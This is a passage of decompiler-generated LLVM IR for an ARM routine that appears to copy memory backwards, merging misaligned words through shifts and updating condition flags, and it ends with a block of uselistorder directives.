  store i1 %v6_de28, i1* %cpsr_v.global-to-local, align 1
  %v7_de28 = icmp slt i32 %v2_de28, 0
  store i1 %v7_de28, i1* %cpsr_n.global-to-local, align 1
  %v8_de28 = icmp eq i32 %v2_de28, 0
  store i1 %v8_de28, i1* %cpsr_z.global-to-local, align 1
  %v5_de2c = icmp slt i32 %v2_de1c, -12
  br i1 %v5_de2c, label %dec_label_pc_de48, label %dec_label_pc_de30

dec_label_pc_de30:                                ; preds = %dec_label_pc_de24, %dec_label_pc_dde4, %dec_label_pc_de30
  %v1_de3c = phi i32 [ %v5_de3c, %dec_label_pc_de30 ], [ %v1_de18, %dec_label_pc_de24 ], [ %v0_de1830, %dec_label_pc_dde4 ]
  %v0_de30 = load i32, i32* %r3.global-to-local, align 4
  %v3_de30 = mul i32 %v0_de30, 256
  store i32 %v3_de30, i32* %ip.global-to-local, align 4
  %v0_de34 = load i32, i32* %r1.global-to-local, align 4
  %v1_de34 = add i32 %v0_de34, -4
  %v2_de34 = inttoptr i32 %v1_de34 to i32*
  %v3_de34 = load i32, i32* %v2_de34, align 4
  store i32 %v3_de34, i32* %r3.global-to-local, align 4
  store i32 %v1_de34, i32* %r1.global-to-local, align 4
  %v4_de38 = udiv i32 %v3_de34, 16777216
  %v5_de38 = or i32 %v4_de38, %v3_de30
  store i32 %v5_de38, i32* %ip.global-to-local, align 4
  %v2_de3c = add i32 %v1_de3c, -4
  %v3_de3c = inttoptr i32 %v2_de3c to i32*
  store i32 %v5_de38, i32* %v3_de3c, align 4
  %v4_de3c = load i32, i32* %r0.global-to-local, align 4
  %v5_de3c = add i32 %v4_de3c, -4
  store i32 %v5_de3c, i32* %r0.global-to-local, align 4
  %v0_de40 = load i32, i32* %r2.global-to-local, align 4
  %v2_de40 = add i32 %v0_de40, -4
  store i32 %v2_de40, i32* %r2.global-to-local, align 4
  %v6_de44 = icmp slt i32 %v0_de40, 4
  br i1 %v6_de44, label %dec_label_pc_de48.loopexit, label %dec_label_pc_de30

dec_label_pc_de48.loopexit:                       ; preds = %dec_label_pc_de30
  %v4_de40 = sub i32 3, %v0_de40
  %v5_de40 = and i32 %v4_de40, %v0_de40
  %v6_de40 = icmp slt i32 %v5_de40, 0
  %v7_de40 = icmp slt i32 %v2_de40, 0
  store i1 %v6_de40, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_de40, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_de48

dec_label_pc_de48:                                ; preds = %dec_label_pc_de48.loopexit, %dec_label_pc_de24
  %v2_dd8c62 = phi i32 [ %v5_de3c, %dec_label_pc_de48.loopexit ], [ %v1_de18, %dec_label_pc_de24 ]
  %v0_dd7c58 = phi i32 [ %v2_de40, %dec_label_pc_de48.loopexit ], [ %v2_de28, %dec_label_pc_de24 ]
  %v0_de48 = load i32, i32* %r1.global-to-local, align 4
  %v1_de48 = add i32 %v0_de48, 3
  store i32 %v1_de48, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_de50:                                ; preds = %dec_label_pc_dde0
  br i1 %v5_dec0, label %dec_label_pc_de9c, label %dec_label_pc_de58

dec_label_pc_de58:                                ; preds = %dec_label_pc_de50
  store i32 %v2_debc, i32* %r2.global-to-local, align 4
  %v3_de5c = load i32, i32* @r4, align 4
  store i32 %v3_de5c, i32* %stack_var_-12, align 4
  %v6_de5c = load i32, i32* @r5, align 4
  store i32 %v6_de5c, i32* %stack_var_-8, align 4
  %v9_de5c = load i32, i32* @lr, align 4
  br label %dec_label_pc_de60

dec_label_pc_de60:                                ; preds = %dec_label_pc_de60.dec_label_pc_de60_crit_edge, %dec_label_pc_de58
  %v0_de84 = phi i32 [ %v1_de84, %dec_label_pc_de60.dec_label_pc_de60_crit_edge ], [ %v0_de1830, %dec_label_pc_de58 ]
  %v0_de64 = phi i32 [ %v0_de64.pre, %dec_label_pc_de60.dec_label_pc_de60_crit_edge ], [ %v1_ddd0, %dec_label_pc_de58 ]
  %v0_de60 = phi i32 [ %v0_de60.pre, %dec_label_pc_de60.dec_label_pc_de60_crit_edge ], [ %v2_ddd4, %dec_label_pc_de58 ]
  %v3_de60 = mul i32 %v0_de60, 65536
  store i32 %v3_de60, i32* %lr.global-to-local, align 4
  %v1_de64 = add i32 %v0_de64, -4
  %v2_de64 = inttoptr i32 %v1_de64 to i32*
  %v3_de64 = load i32, i32* %v2_de64, align 4
  store i32 %v3_de64, i32* %r3.global-to-local, align 4
  %v4_de64 = add i32 %v0_de64, -8
  %v5_de64 = inttoptr i32 %v4_de64 to i32*
  %v6_de64 = load i32, i32* %v5_de64, align 4
  store i32 %v6_de64, i32* %r4.global-to-local, align 4
  %v7_de64 = add i32 %v0_de64, -12
  %v8_de64 = inttoptr i32 %v7_de64 to i32*
  %v9_de64 = load i32, i32* %v8_de64, align 4
  store i32 %v9_de64, i32* %r5.global-to-local, align 4
  %v10_de64 = add i32 %v0_de64, -16
  %v11_de64 = inttoptr i32 %v10_de64 to i32*
  %v12_de64 = load i32, i32* %v11_de64, align 4
  store i32 %v10_de64, i32* %r1.global-to-local, align 4
  %v4_de68 = udiv i32 %v12_de64, 65536
  %v5_de68 = or i32 %v4_de68, %v3_de60
  store i32 %v5_de68, i32* %lr.global-to-local, align 4
  %v3_de6c = mul i32 %v12_de64, 65536
  %v4_de70 = udiv i32 %v9_de64, 65536
  %v5_de70 = or i32 %v3_de6c, %v4_de70
  store i32 %v5_de70, i32* %ip.global-to-local, align 4
  %v3_de74 = mul i32 %v9_de64, 65536
  %v4_de78 = udiv i32 %v6_de64, 65536
  %v5_de78 = or i32 %v3_de74, %v4_de78
  store i32 %v5_de78, i32* %r5.global-to-local, align 4
  %v3_de7c = mul i32 %v6_de64, 65536
  %v4_de80 = udiv i32 %v3_de64, 65536
  %v5_de80 = or i32 %v3_de7c, %v4_de80
  store i32 %v5_de80, i32* %r4.global-to-local, align 4
  %v1_de84 = add i32 %v0_de84, -16
  %v2_de84 = inttoptr i32 %v1_de84 to i32*
  store i32 %v5_de80, i32* %v2_de84, align 4
  %v4_de84 = add i32 %v0_de84, -12
  %v5_de84 = inttoptr i32 %v4_de84 to i32*
  %v6_de84 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_de84, i32* %v5_de84, align 4
  %v7_de84 = add i32 %v0_de84, -8
  %v8_de84 = inttoptr i32 %v7_de84 to i32*
  %v9_de84 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_de84, i32* %v8_de84, align 4
  %v10_de84 = add i32 %v0_de84, -4
  %v11_de84 = inttoptr i32 %v10_de84 to i32*
  %v12_de84 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_de84, i32* %v11_de84, align 4
  store i32 %v1_de84, i32* %r0.global-to-local, align 4
  %v0_de88 = load i32, i32* %r2.global-to-local, align 4
  %v2_de88 = add i32 %v0_de88, -16
  store i32 %v2_de88, i32* %r2.global-to-local, align 4
  %v6_de8c = icmp slt i32 %v0_de88, 16
  br i1 %v6_de8c, label %dec_label_pc_de90, label %dec_label_pc_de60.dec_label_pc_de60_crit_edge

dec_label_pc_de60.dec_label_pc_de60_crit_edge:    ; preds = %dec_label_pc_de60
  %v0_de60.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_de64.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_de60

dec_label_pc_de90:                                ; preds = %dec_label_pc_de60
  %v2_de90 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_de90, i32* @r4, align 4
  %v5_de90 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_de90, i32* @r5, align 4
  store i32 %v9_de5c, i32* @lr, align 4
  %v2_de94 = add i32 %v0_de88, -4
  store i32 %v2_de94, i32* %r2.global-to-local, align 4
  %v4_de94 = add i32 %v0_de88, 2147483632
  %v5_de94 = and i32 %v2_de94, %v4_de94
  %v6_de94 = icmp slt i32 %v5_de94, 0
  store i1 %v6_de94, i1* %cpsr_v.global-to-local, align 1
  %v7_de94 = icmp slt i32 %v2_de94, 0
  store i1 %v7_de94, i1* %cpsr_n.global-to-local, align 1
  %v8_de94 = icmp eq i32 %v2_de94, 0
  store i1 %v8_de94, i1* %cpsr_z.global-to-local, align 1
  %v5_de98 = icmp slt i32 %v2_de88, -12
  br i1 %v5_de98, label %dec_label_pc_deb4, label %dec_label_pc_de9c

dec_label_pc_de9c:                                ; preds = %dec_label_pc_de90, %dec_label_pc_de50, %dec_label_pc_de9c
  %v1_dea8 = phi i32 [ %v5_dea8, %dec_label_pc_de9c ], [ %v1_de84, %dec_label_pc_de90 ], [ %v0_de1830, %dec_label_pc_de50 ]
  %v0_de9c = load i32, i32* %r3.global-to-local, align 4
  %v3_de9c = mul i32 %v0_de9c, 65536
  store i32 %v3_de9c, i32* %ip.global-to-local, align 4
  %v0_dea0 = load i32, i32* %r1.global-to-local, align 4
  %v1_dea0 = add i32 %v0_dea0, -4
  %v2_dea0 = inttoptr i32 %v1_dea0 to i32*
  %v3_dea0 = load i32, i32* %v2_dea0, align 4
  store i32 %v3_dea0, i32* %r3.global-to-local, align 4
  store i32 %v1_dea0, i32* %r1.global-to-local, align 4
  %v4_dea4 = udiv i32 %v3_dea0, 65536
  %v5_dea4 = or i32 %v4_dea4, %v3_de9c
  store i32 %v5_dea4, i32* %ip.global-to-local, align 4
  %v2_dea8 = add i32 %v1_dea8, -4
  %v3_dea8 = inttoptr i32 %v2_dea8 to i32*
  store i32 %v5_dea4, i32* %v3_dea8, align 4
  %v4_dea8 = load i32, i32* %r0.global-to-local, align 4
  %v5_dea8 = add i32 %v4_dea8, -4
  store i32 %v5_dea8, i32* %r0.global-to-local, align 4
  %v0_deac = load i32, i32* %r2.global-to-local, align 4
  %v2_deac = add i32 %v0_deac, -4
  store i32 %v2_deac, i32* %r2.global-to-local, align 4
  %v6_deb0 = icmp slt i32 %v0_deac, 4
  br i1 %v6_deb0, label %dec_label_pc_deb4.loopexit, label %dec_label_pc_de9c

dec_label_pc_deb4.loopexit:                       ; preds = %dec_label_pc_de9c
  %v4_deac = sub i32 3, %v0_deac
  %v5_deac = and i32 %v4_deac, %v0_deac
  %v6_deac = icmp slt i32 %v5_deac, 0
  %v7_deac = icmp slt i32 %v2_deac, 0
  store i1 %v6_deac, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_deac, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_deb4

dec_label_pc_deb4:                                ; preds = %dec_label_pc_deb4.loopexit, %dec_label_pc_de90
  %v2_dd8c63 = phi i32 [ %v5_dea8, %dec_label_pc_deb4.loopexit ], [ %v1_de84, %dec_label_pc_de90 ]
  %v0_dd7c59 = phi i32 [ %v2_deac, %dec_label_pc_deb4.loopexit ], [ %v2_de94, %dec_label_pc_de90 ]
  %v0_deb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_deb4 = add i32 %v0_deb4, 2
  store i32 %v1_deb4, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_debc:                                ; preds = %dec_label_pc_ddd0
  br i1 %v5_dec0, label %dec_label_pc_df08, label %dec_label_pc_dec4

dec_label_pc_dec4:                                ; preds = %dec_label_pc_debc
  store i32 %v2_debc, i32* %r2.global-to-local, align 4
  %v3_dec8 = load i32, i32* @r4, align 4
  store i32 %v3_dec8, i32* %stack_var_-12, align 4
  %v6_dec8 = load i32, i32* @r5, align 4
  store i32 %v6_dec8, i32* %stack_var_-8, align 4
  %v9_dec8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_decc

dec_label_pc_decc:                                ; preds = %dec_label_pc_decc.dec_label_pc_decc_crit_edge, %dec_label_pc_dec4
  %v0_def0 = phi i32 [ %v1_def0, %dec_label_pc_decc.dec_label_pc_decc_crit_edge ], [ %v0_de1830, %dec_label_pc_dec4 ]
  %v0_ded0 = phi i32 [ %v0_ded0.pre, %dec_label_pc_decc.dec_label_pc_decc_crit_edge ], [ %v1_ddd0, %dec_label_pc_dec4 ]
  %v0_decc = phi i32 [ %v0_decc.pre, %dec_label_pc_decc.dec_label_pc_decc_crit_edge ], [ %v2_ddd4, %dec_label_pc_dec4 ]
  %v3_decc = mul i32 %v0_decc, 16777216
  store i32 %v3_decc, i32* %lr.global-to-local, align 4
  %v1_ded0 = add i32 %v0_ded0, -4
  %v2_ded0 = inttoptr i32 %v1_ded0 to i32*
  %v3_ded0 = load i32, i32* %v2_ded0, align 4
  store i32 %v3_ded0, i32* %r3.global-to-local, align 4
  %v4_ded0 = add i32 %v0_ded0, -8
  %v5_ded0 = inttoptr i32 %v4_ded0 to i32*
  %v6_ded0 = load i32, i32* %v5_ded0, align 4
  store i32 %v6_ded0, i32* %r4.global-to-local, align 4
  %v7_ded0 = add i32 %v0_ded0, -12
  %v8_ded0 = inttoptr i32 %v7_ded0 to i32*
  %v9_ded0 = load i32, i32* %v8_ded0, align 4
  store i32 %v9_ded0, i32* %r5.global-to-local, align 4
  %v10_ded0 = add i32 %v0_ded0, -16
  %v11_ded0 = inttoptr i32 %v10_ded0 to i32*
  %v12_ded0 = load i32, i32* %v11_ded0, align 4
  store i32 %v10_ded0, i32* %r1.global-to-local, align 4
  %v4_ded4 = udiv i32 %v12_ded0, 256
  %v5_ded4 = or i32 %v4_ded4, %v3_decc
  store i32 %v5_ded4, i32* %lr.global-to-local, align 4
  %v3_ded8 = mul i32 %v12_ded0, 16777216
  %v4_dedc = udiv i32 %v9_ded0, 256
  %v5_dedc = or i32 %v3_ded8, %v4_dedc
  store i32 %v5_dedc, i32* %ip.global-to-local, align 4
  %v3_dee0 = mul i32 %v9_ded0, 16777216
  %v4_dee4 = udiv i32 %v6_ded0, 256
  %v5_dee4 = or i32 %v3_dee0, %v4_dee4
  store i32 %v5_dee4, i32* %r5.global-to-local, align 4
  %v3_dee8 = mul i32 %v6_ded0, 16777216
  %v4_deec = udiv i32 %v3_ded0, 256
  %v5_deec = or i32 %v3_dee8, %v4_deec
  store i32 %v5_deec, i32* %r4.global-to-local, align 4
  %v1_def0 = add i32 %v0_def0, -16
  %v2_def0 = inttoptr i32 %v1_def0 to i32*
  store i32 %v5_deec, i32* %v2_def0, align 4
  %v4_def0 = add i32 %v0_def0, -12
  %v5_def0 = inttoptr i32 %v4_def0 to i32*
  %v6_def0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_def0, i32* %v5_def0, align 4
  %v7_def0 = add i32 %v0_def0, -8
  %v8_def0 = inttoptr i32 %v7_def0 to i32*
  %v9_def0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_def0, i32* %v8_def0, align 4
  %v10_def0 = add i32 %v0_def0, -4
  %v11_def0 = inttoptr i32 %v10_def0 to i32*
  %v12_def0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_def0, i32* %v11_def0, align 4
  store i32 %v1_def0, i32* %r0.global-to-local, align 4
  %v0_def4 = load i32, i32* %r2.global-to-local, align 4
  %v2_def4 = add i32 %v0_def4, -16
  store i32 %v2_def4, i32* %r2.global-to-local, align 4
  %v6_def8 = icmp slt i32 %v0_def4, 16
  br i1 %v6_def8, label %dec_label_pc_defc, label %dec_label_pc_decc.dec_label_pc_decc_crit_edge

dec_label_pc_decc.dec_label_pc_decc_crit_edge:    ; preds = %dec_label_pc_decc
  %v0_decc.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_ded0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_decc

dec_label_pc_defc:                                ; preds = %dec_label_pc_decc
  %v2_defc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_defc, i32* @r4, align 4
  %v5_defc = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_defc, i32* @r5, align 4
  store i32 %v9_dec8, i32* @lr, align 4
  %v2_df00 = add i32 %v0_def4, -4
  store i32 %v2_df00, i32* %r2.global-to-local, align 4
  %v4_df00 = add i32 %v0_def4, 2147483632
  %v5_df00 = and i32 %v2_df00, %v4_df00
  %v6_df00 = icmp slt i32 %v5_df00, 0
  store i1 %v6_df00, i1* %cpsr_v.global-to-local, align 1
  %v7_df00 = icmp slt i32 %v2_df00, 0
  store i1 %v7_df00, i1* %cpsr_n.global-to-local, align 1
  %v8_df00 = icmp eq i32 %v2_df00, 0
  store i1 %v8_df00, i1* %cpsr_z.global-to-local, align 1
  %v5_df04 = icmp slt i32 %v2_def4, -12
  br i1 %v5_df04, label %dec_label_pc_df20, label %dec_label_pc_df08

dec_label_pc_df08:                                ; preds = %dec_label_pc_defc, %dec_label_pc_debc, %dec_label_pc_df08
  %v1_df14 = phi i32 [ %v5_df14, %dec_label_pc_df08 ], [ %v1_def0, %dec_label_pc_defc ], [ %v0_de1830, %dec_label_pc_debc ]
  %v0_df08 = load i32, i32* %r3.global-to-local, align 4
  %v3_df08 = mul i32 %v0_df08, 16777216
  store i32 %v3_df08, i32* %ip.global-to-local, align 4
  %v0_df0c = load i32, i32* %r1.global-to-local, align 4
  %v1_df0c = add i32 %v0_df0c, -4
  %v2_df0c = inttoptr i32 %v1_df0c to i32*
  %v3_df0c = load i32, i32* %v2_df0c, align 4
  store i32 %v3_df0c, i32* %r3.global-to-local, align 4
  store i32 %v1_df0c, i32* %r1.global-to-local, align 4
  %v4_df10 = udiv i32 %v3_df0c, 256
  %v5_df10 = or i32 %v4_df10, %v3_df08
  store i32 %v5_df10, i32* %ip.global-to-local, align 4
  %v2_df14 = add i32 %v1_df14, -4
  %v3_df14 = inttoptr i32 %v2_df14 to i32*
  store i32 %v5_df10, i32* %v3_df14, align 4
  %v4_df14 = load i32, i32* %r0.global-to-local, align 4
  %v5_df14 = add i32 %v4_df14, -4
  store i32 %v5_df14, i32* %r0.global-to-local, align 4
  %v0_df18 = load i32, i32* %r2.global-to-local, align 4
  %v2_df18 = add i32 %v0_df18, -4
  store i32 %v2_df18, i32* %r2.global-to-local, align 4
  %v6_df1c = icmp slt i32 %v0_df18, 4
  br i1 %v6_df1c, label %dec_label_pc_df20.loopexit, label %dec_label_pc_df08

dec_label_pc_df20.loopexit:                       ; preds = %dec_label_pc_df08
  %v4_df18 = sub i32 3, %v0_df18
  %v5_df18 = and i32 %v4_df18, %v0_df18
  %v6_df18 = icmp slt i32 %v5_df18, 0
  %v7_df18 = icmp slt i32 %v2_df18, 0
  store i1 %v6_df18, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_df18, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_df20

dec_label_pc_df20:                                ; preds = %dec_label_pc_df20.loopexit, %dec_label_pc_defc
  %v2_dd8c64 = phi i32 [ %v5_df14, %dec_label_pc_df20.loopexit ], [ %v1_def0, %dec_label_pc_defc ]
  %v0_dd7c60 = phi i32 [ %v2_df18, %dec_label_pc_df20.loopexit ], [ %v2_df00, %dec_label_pc_defc ]
  %v0_df20 = load i32, i32* %r1.global-to-local, align 4
  %v1_df20 = add i32 %v0_df20, 1
  store i32 %v1_df20, i32* %r1.global-to-local, align 4
  br label %bb141

; uselistorder directives
  uselistorder i32 %v5_df14, { 0, 2, 1 }
  uselistorder i32 %v3_df08, { 1, 0 }
  uselistorder i32 %v2_df00, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_def0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_ded0, { 1, 0 }
  uselistorder i32 %v3_decc, { 1, 0 }
  uselistorder i32 %v0_ded0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_def0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_dea8, { 0, 2, 1 }
  uselistorder i32 %v3_de9c, { 1, 0 }
  uselistorder i32 %v2_de94, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_de84, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_de64, { 1, 0 }
  uselistorder i32 %v3_de60, { 1, 0 }
  uselistorder i32 %v0_de64, { 3, 2, 1, 0 }
  uselistorder i32 %v0_de84, { 3, 2, 1, 0 }
  uselistorder i32 %v5_de3c, { 0, 2, 1 }
  uselistorder i32 %v3_de30, { 1, 0 }
  uselistorder i32 %v2_de28, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_de18, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_ddf8, { 1, 0 }
  uselistorder i32 %v3_ddf4, { 1, 0 }
  uselistorder i32 %v0_ddf8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_de18, { 3, 2, 1, 0 }
  uselistorder i1 %v5_dec0, { 2, 0, 1 }
  uselistorder i32 %v0_ddd8, { 1, 0 }
  uselistorder i32 %v0_dec4, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_de1830, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_ddc8, { 2, 1, 0 }
  uselistorder i32 %v0_ddc8, { 2, 0, 1 }
  uselistorder i32 %v2_ddc0, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_ddc0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_ddc0, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_de1831, { 2, 1, 0 }
  uselistorder i32 %v11_dd9c, { 1, 0 }
  uselistorder i32 %v7_dd9c, { 1, 0 }
  uselistorder i32 %v1_dd7c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_dd7c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_dd80, { 1, 0 }
  uselistorder i32 %v7_dd74, { 0, 2, 1 }
  uselistorder i32 %v10_dd70, { 1, 0 }
  uselistorder i32 %v9_dd68, { 1, 0, 2 }
  uselistorder i32 %v6_dd64, { 1, 0 }
  uselistorder i32 %v2_dd5c, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_dd5c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_dd6c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_dd50, { 0, 2, 1 }
  uselistorder i32 %v13_dd4c, { 1, 0 }
  uselistorder i32 %v4_dd48, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_dd48, { 2, 0, 1 }
  uselistorder i32 %v6_dd50, { 0, 3, 2, 1 }
  uselistorder i32 %v7_dd40, { 0, 2, 1 }
  uselistorder i32 %v16_dd3c, { 1, 0 }
  uselistorder i32 %v4_dd38, { 1, 2, 0 }
  uselistorder i32 %v0_dd48.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_dd40, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_dd2c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_dd28, { 1, 0 }
  uselistorder i32 %v1_dd24, { 1, 0 }
  uselistorder i32 %v10_dd20, { 1, 0 }
  uselistorder i32 %v0_dd20, { 3, 2, 1, 0 }
  uselistorder i32 %v0_dd24, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_dd18, { 0, 2, 1 }
  uselistorder i32 %v2_dd0c, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_dd0c, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_dd2448, { 1, 2, 0 }
  uselistorder i32 %v1_dd04, { 2, 1, 0 }
  uselistorder i32 %v1_dcfc, { 2, 3, 1, 0 }
  uselistorder i32 %v2_dcf4, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_dcf0, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_dcec, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_dcec, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v4_dcd8, { 0, 2, 1 }
  uselistorder i32 %v3_dccc, { 1, 0 }
  uselistorder i32 %v2_dcc4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v12_dcb4, { 1, 0, 3, 2 }
  uselistorder i32 %v8_dc94, { 1, 0, 2 }
  uselistorder i32 %v5_dc94, { 1, 0, 2 }
  uselistorder i32 %v2_dc94, { 1, 0, 2 }
  uselistorder i32 %v3_dc90, { 1, 0 }
  uselistorder i32 %v0_dc94, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_dcb4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_dc6c, { 0, 2, 1 }
  uselistorder i32 %v3_dc60, { 1, 0 }
  uselistorder i32 %v2_dc58, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v12_dc48, { 1, 0, 3, 2 }
  uselistorder i32 %v8_dc28, { 1, 0, 2 }
  uselistorder i32 %v5_dc28, { 1, 0, 2 }
  uselistorder i32 %v2_dc28, { 1, 0, 2 }
  uselistorder i32 %v3_dc24, { 1, 0 }
  uselistorder i32 %v0_dc28, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_dc48, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_dc00, { 0, 2, 1 }
  uselistorder i32 %v3_dbf4, { 1, 0 }
  uselistorder i32 %v2_dbec, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v12_dbdc, { 1, 0, 3, 2 }
  uselistorder i32 %v8_dbbc, { 1, 0, 2 }
  uselistorder i32 %v5_dbbc, { 1, 0, 2 }
  uselistorder i32 %v2_dbbc, { 1, 0, 2 }
  uselistorder i32 %v3_dbb8, { 1, 0 }
  uselistorder i32 %v0_dbbc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_dbdc, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_dc84, { 2, 0, 1 }
  uselistorder i32 %v0_dc88, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_dbdc74, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_db8c, { 1, 0 }
  uselistorder i32 %v0_db8c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_db84, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_db84, { 1, 2, 0, 3 }
  uselistorder i32 %v0_db84, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_dbdc75, { 2, 1, 0 }
  uselistorder i32 %v1_db64, { 1, 0, 2 }
  uselistorder i32 %v1_db3c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_db3c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_db28, { 1, 0, 2 }
  uselistorder i32 %v6_db24, { 1, 0 }
  uselistorder i32 %v2_db1c, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_db1c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_db2c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_db14, { 0, 2, 1 }
  uselistorder i32 %v3_db14, { 3, 0, 1, 2 }
  uselistorder i1 %v0_db14, { 1, 0 }
  uselistorder i1 %v1_db14, { 1, 0 }
  uselistorder i32 %v3_db10, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_db08, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v4_daf4, { 1, 2, 0 }
  uselistorder i32 %v12_dae8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_dadc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_dae0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_dad0, { 0, 2, 1 }
  uselistorder i32 %v2_dac8, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_dac8, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v1_dac0, { 1, 0 }
  uselistorder i32 %v1_dab8, { 2, 1, 0 }
  uselistorder i32 %v2_dab0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_dab0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v2_daa0, { 1, 0 }
  uselistorder i32 %v1_daa0, { 1, 5, 6, 3, 4, 0, 7, 9, 2, 8, 10 }
  uselistorder i32 %v0_daa0, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 25, 26, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r3.global-to-local, { 0, 37, 1, 2, 3, 38, 4, 5, 6, 39, 35, 36, 40, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %r2.global-to-local, { 0, 27, 1, 2, 3, 4, 5, 28, 6, 7, 8, 9, 10, 67, 68, 69, 70, 71, 11, 29, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 30, 31, 62, 32, 33, 34, 35, 36, 63, 37, 38, 39, 40, 41, 64, 42, 43, 44, 45, 46, 65, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 66 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 0, 12, 2, 4, 6, 8, 5, 13, 7, 9, 11, 65, 10, 64, 63, 66, 14, 19, 15, 16, 17, 18, 20, 21, 23, 22, 24, 25, 34, 26, 27, 35, 28, 36, 29, 37, 30, 31, 32, 33, 38, 41, 39, 51, 40, 42, 45, 43, 52, 44, 46, 49, 47, 53, 48, 50, 54, 55, 56, 58, 57, 59, 60, 61, 62 }
